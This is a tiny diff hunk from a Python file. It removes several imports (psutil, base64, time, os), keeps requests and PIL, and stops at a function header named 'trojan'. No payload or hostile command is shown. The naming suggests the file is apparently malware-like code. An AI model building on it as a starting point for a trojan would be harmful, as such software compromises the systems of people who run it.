@@ -1,8 +1,4 @@
-import psutil
-import base64
-import time
 import requests
-import os
 from PIL import Image
 
 def trojan():
